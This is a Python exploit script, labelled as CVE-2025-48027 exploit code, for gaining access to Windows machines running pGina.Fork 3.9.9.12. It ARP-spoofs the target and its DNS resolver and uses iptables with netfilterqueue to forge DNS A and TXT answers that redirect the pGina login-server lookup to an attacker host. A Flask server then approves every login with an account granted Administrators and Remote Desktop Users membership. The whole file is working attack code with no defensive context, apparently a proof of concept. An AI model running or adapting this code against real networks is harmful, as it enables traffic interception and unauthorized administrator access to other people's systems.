import argparse
import os
import subprocess
import threading
import time
from queue import Queue
from netfilterqueue import NetfilterQueue

from flask import Flask, request, Response
from scapy.all import ARP, DNS, DNSQR, DNSRR, Ether, IP, UDP, get_if_hwaddr, getmacbyip, sendp, send, sniff

class DnsSpoofer:
    def __init__(self, targetIp: str, targetResolver: str, pginaloginserverIP: str, httpListenerInterface: str, qname: str = None, poisonedLoginServerUrl: str = None, dropQname: str = None):
        self.targetIp = targetIp
        self.targetResolver = targetResolver
        self.pginaloginserverIP = pginaloginserverIP
        self.httpListenerInterface = httpListenerInterface
        self.dropQname = dropQname.lower() if dropQname else None
        self.records = {}
        self.nfqueue = None

        if qname and poisonedLoginServerUrl:
            self.records[qname.lower()] = {
                'A': self.pginaloginserverIP,
                'TXT': self.createTxtRecord(poisonedLoginServerUrl),
            }
        else:
            raise ValueError('Both \'qname\' and \'poisonedLoginServerUrl\' must be provided.')

    def createTxtRecord(self, poisonedLoginServerUrl: str) -> bytes:
        return bytes(poisonedLoginServerUrl, 'utf-8')

    def start(self) -> None:
        print('[*] Starting DNS spoofing and packet interception (netfilterqueue).')
        self.addNetfilterQueueRule()
        self.nfqueue = NetfilterQueue()
        self.nfqueue.bind(1, self.dnsIntercept)
        try:
            self.nfqueue.run()
        except KeyboardInterrupt:
            print('[!] Interrupted.')

    def dnsIntercept(self, pkt) -> None:
        payload = pkt.get_payload()
        scapy_pkt = IP(payload)

        if scapy_pkt.haslayer(DNSQR) and self.targetResolver == scapy_pkt[IP].src and self.targetIp == scapy_pkt[IP].dst:
            qname = scapy_pkt[DNSQR].qname.decode().lower()
            qtype = scapy_pkt[DNSQR].qtype

            if self.dropQname and self.dropQname in qname:
                print('[!] Dropping DNS response for {}.'.format(qname))
                pkt.drop()
                return

            for recordName in self.records:
                if qname.startswith(recordName):
                    print('[+] Spoofing DNS response for {}.'.format(qname))

                    if qtype == 1: # A Record
                        answer = DNSRR(
                            rrname=qname,
                            type='A',
                            rclass='IN',
                            ttl=60,
                            rdata=self.pginaloginserverIP
                        )
                    elif qtype == 28: # AAAA Record
                        pkt.drop()
                        return
                    elif qtype == 16: # TXT Record
                        txtPayload = self.records[recordName]['TXT'].decode('utf-8')
                        answer = DNSRR(
                            rrname=qname,
                            type='TXT',
                            rclass='IN',
                            ttl=60,
                            rdata=txtPayload
                        )
                    else:
                        print('[!] Unsupported query type: {}.'.format(qtype))
                        pkt.accept()
                        return

                    spoofed                = scapy_pkt.copy()
                    spoofed[DNS].an        = answer
                    spoofed[DNS].rcode     = 0
                    spoofed[DNS].qdcount   = 1
                    spoofed[DNS].ancount   = 1
                    spoofed[DNS].arcount   = 0
                    spoofed[DNS].nscount   = 0

                    del spoofed[IP].len
                    del spoofed[IP].chksum
                    del spoofed[UDP].len
                    del spoofed[UDP].chksum

                    # Required for some reason, issue with len / checksum recalculation
                    spoofed = IP(bytes(spoofed))

                    # print('[DEBUG] Incoming DNS response:')
                    # print(scapy_pkt.show(dump=True))

                    # print('[DEBUG] Spoofed DNS response:')
                    # print(spoofed.show(dump=True))

                    send(spoofed, verbose=1)
                    pkt.drop()

                    return

        pkt.accept()

    def addNetfilterQueueRule(self):
        print('[*] Adding iptables rule to redirect DNS traffic to NFQUEUE.')
        subprocess.run(['iptables', '-I', 'FORWARD', '-p', 'udp', '--sport', '53', '-j', 'NFQUEUE', '--queue-num', '1'], stdout=subprocess.DEVNULL)
        print('[+] iptables rule added.')

    def removeNetfilterQueueRule(self):
        print('[*] Removing iptables NFQUEUE rule.')
        subprocess.run(['iptables', '-D', 'FORWARD', '-p', 'udp', '--sport', '53', '-j', 'NFQUEUE', '--queue-num', '1'], stdout=subprocess.DEVNULL)
        print('[+] iptables rule removed.')

def enableIpForwarding():
    subprocess.run(['sysctl', '-w', 'net.ipv4.ip_forward=1'], stdout=subprocess.DEVNULL)
    print('[+] IP forwarding enabled.')

def disableIpForwarding():
    subprocess.run(['sysctl', '-w', 'net.ipv4.ip_forward=0'], stdout=subprocess.DEVNULL)
    print('[+] IP forwarding disabled.')

def runArpSpoofing(targetIp: str, targetResolver: str, httpListenerInterface: str) -> None:
    enableIpForwarding()
    print('[*] Starting ARP spoofing between {} and {} on {}.'.format(targetIp, targetResolver, httpListenerInterface))
    try:
        attackerMac = get_if_hwaddr(httpListenerInterface)
        targetMac = getmacbyip(targetIp)
        resolverMac = getmacbyip(targetResolver)

        if not targetMac or not resolverMac:
            print('[!] Failed to get MAC addresses.')
            return

        while True:
            pktToTarget = Ether(dst=targetMac) / ARP(op=2, psrc=targetResolver, pdst=targetIp, hwdst=targetMac, hwsrc=attackerMac)
            pktToResolver = Ether(dst=resolverMac) / ARP(op=2, psrc=targetIp, pdst=targetResolver, hwdst=resolverMac, hwsrc=attackerMac)
            sendp(pktToTarget, iface=httpListenerInterface, verbose=0)
            sendp(pktToResolver, iface=httpListenerInterface, verbose=0)
            time.sleep(1)

    except KeyboardInterrupt:
        print('[!] ARP spoofing stopped.')

app = Flask(__name__)

@app.route('/', defaults={'path': ''}, methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS', 'HEAD'])
@app.route('/<path:path>', methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS', 'HEAD'])
def catchAll(path):
    print('[+] HTTP {} Request for URL: /{}'.format(request.method, path))
    print('[*] HTTP Data: {}'.format(request.data))

    whyCannotLogin     = '' # https://github.com/MutonUfoAI/pgina/blob/1922de0fe27492c09d2f188c2c7e54a4b364bbad/Plugins/HttpAuth/HttpAuth/UInfo.cs#L22
    samAccountName     = 'qwerty'
    accountName        = 'net qwerty'
    accountEmail       = 'qwerty@packetlabs.net'
    grantGroups        = ';'.join(app.config['GRANT_GROUP'])

    payload = '\n'.join([
        whyCannotLogin,
        samAccountName,
        accountName,
        accountEmail,
        grantGroups,
    ])

    print('[+] Sending pginaloginserver HTTP respons:\n{}'.format(payload))
    return Response(payload, mimetype='text/plain')

def runHttpServer(interfaceIp: str = '0.0.0.0', grant_group='Administrators,Users,Remote Desktop Users') -> None:
    print('[*] HTTP server listening on {}:8080'.format(interfaceIp))
    app.config['GRANT_GROUP'] = [g.strip() for g in grant_group.split(',')]
    app.run(host=interfaceIp, port=8080, threaded=True)

def runDnsSpoofer(targetIp: str, targetResolver: str, pginaloginserverIP: str, httpListenerInterface: str, qname: str, poisonedLoginServerUrl: str, dropQname: str, resultQueue: Queue) -> None:
    try:
        dnsSpoofer = DnsSpoofer(targetIp, targetResolver, pginaloginserverIP, httpListenerInterface, qname, poisonedLoginServerUrl, dropQname)
        resultQueue.put(dnsSpoofer)
        dnsSpoofer.start()
    except ValueError as e:
        print('Error:', e)

def gotRoot():
    if os.geteuid() != 0:
        print('[!] Got root? Exiting.')
        return 1
    return 0

def main():
    parser = argparse.ArgumentParser(description='CVE-2025-48027 exploit code for gaining access to pGina.Fork 3.9.9.12.')
    parser.add_argument('-target-ip', type=str, required=True, help='Target\'s IP address.', metavar='')
    parser.add_argument('-target-resolver', type=str, required=True, help='DNS resolver IP address.', metavar='')
    parser.add_argument('-pginaloginserver-ip', type=str, required=True, help='The IPv4 address defined within the `pGinaDefaultLookupDomain` argument.', metavar='')
    parser.add_argument('-http-listener-interface', type=str, required=True, help='Network interface for the HTTP listener', metavar='')
    parser.add_argument('-pGinaDefaultLookupDomain', type=str, required=True, default='pginaloginserver.', help='Domain name pGina.Fork attempts to resolve `startswith()`.', metavar='')
    parser.add_argument('-poisoned-login-server-url', type=str, required=True, help='The URL of the adversary login server.', metavar='')
    parser.add_argument('-grant-group', type=str, help='Comma-separated list of groups (e.g., \'Administrators,Users,Remote Desktop Users\').', default='Administrators,Users,Remote Desktop Users,Remote Management Users', metavar='')
    parser.add_argument('-dropqname', type=str, help='DNS name to silently drop.', metavar='') # This was required sometimes when testing, this is the existing `pginaloginserver` domain. 
    args = parser.parse_args()

    if gotRoot():
        return

    resultQueue = Queue()

    dnsSpoofingThread = threading.Thread(
        target=runDnsSpoofer,
        args=(args.target_ip, args.target_resolver, args.pginaloginserver_ip, args.http_listener_interface, args.pGinaDefaultLookupDomain, args.poisoned_login_server_url, args.dropqname, resultQueue),
        daemon=True
    )

    arpSpoofingThread = threading.Thread(
        target=runArpSpoofing,
        args=(args.target_ip, args.target_resolver, args.http_listener_interface),
        daemon=True
    )

    httpThread = threading.Thread(
        target=runHttpServer,
        args=(args.pginaloginserver_ip,args.grant_group,),
        daemon=True
    )

    dnsSpoofingThread.start()
    arpSpoofingThread.start()
    httpThread.start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        disableIpForwarding()
        dnsSpooferInstance = resultQueue.get()
        dnsSpooferInstance.nfqueue.unbind()
        dnsSpooferInstance.removeNetfilterQueueRule()
        print('[*] Shutting down.')

if __name__ == '__main__':
    main()

